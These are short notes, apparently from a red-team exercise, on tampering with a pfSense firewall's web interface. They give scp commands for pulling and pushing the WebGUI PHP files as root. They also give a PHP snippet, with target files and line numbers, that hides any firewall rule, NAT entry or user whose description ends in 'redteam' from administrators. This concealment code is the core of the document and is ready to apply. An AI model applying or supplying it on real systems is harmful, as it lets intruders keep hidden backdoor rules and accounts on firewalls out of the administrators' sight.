PFSense information:

PFSense keeps the php files for the WebGUI in /usr/local/www

To SCP files from PFSense:
scp root@( PFSense IP Address ):/usr/local/www/( PFSense File ) /( Destination )

To SCP files to PSFense:
scp ( local file ) root@( PFSense IP Address ):/usr/local/www

Why?  That is just SCP dummy.  Yes, it is.. but the issue was that using "admin" doesn't work and you have to use "root".

Fun code to insert into some files:

if (strpos($___ent['descr'], "redteam"))
continue;

into the following files:

File                          ~Line #            Variable Name
firewall_nat.php              Line 227           natent
firewall_rules.php            Line 414           filterent
system_usermanager.php        Line 953           userent
firewall_nat_1to1.php         Line 203           natent

Which will hide rules, nats, 1to1 nats, and users with the string "redteam" at the end of the description/fullname.  
So, don't start the description/fullname with "redteam".  "SSHredteam" == good, "redteamRule" != good.

Issues?  Well, when you go to edit a NAT/1to1 NAT/Rule the webGUI array starts with id of 0 but NAT/1to1 NAT/Rules 
in the database have hidden elements so the webGUI might pull up a hidden NAT/1to1 NAT/Rule.  I left this in place 
so the blue team can still fix stuff by altering the URL and changing the URL variable "id".
